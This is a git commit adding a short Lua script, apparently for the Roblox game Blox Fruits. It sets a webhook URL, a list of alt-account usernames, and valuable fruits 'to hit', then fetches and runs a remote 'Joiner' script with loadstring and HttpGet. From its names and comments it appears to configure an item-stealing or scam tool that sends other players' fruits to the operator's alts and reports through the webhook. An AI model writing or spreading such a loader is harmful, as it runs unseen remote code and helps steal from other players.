e6114d381c1d849d45f641ecede04a555e9b8cbe
kn-h0b <nebisatyusifova@gmail.com>
2025-04-15 09:35:46 +0400

    Create SharkyvsRua.lua

---
+++ SharkyvsRua.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=VnRWZVZBYmYxZFJpY1d1alFkVGh0UTpjMFJ1TFNwSnhBMGhWN29NandNRWlzLVQ4MTFBYlgtM1oyNjBoeTBkeDFFR1N1NmFrTkt3b0ZVUXZBeGNEZDV1VnFtbUJyb09Uejh3VlpnejJlb3BncFA3ME0xOEVWSC1mU2VheW5aQmd0ZEFDVkNnUFZsMTloS3ZOS3hhcG9UWmVrdGNVS2ZLdnhSVjlDZlJNa0VGM0s1QUVXWkVnSVFEYVVHTW1kZU41MzA" -- << Your Webhook
+Usernames = {"AWALS2011", "im_kiddd8", "im_kiddd9"} -- << Your usernames here, you can add as many alts as you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want the script to detect
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()
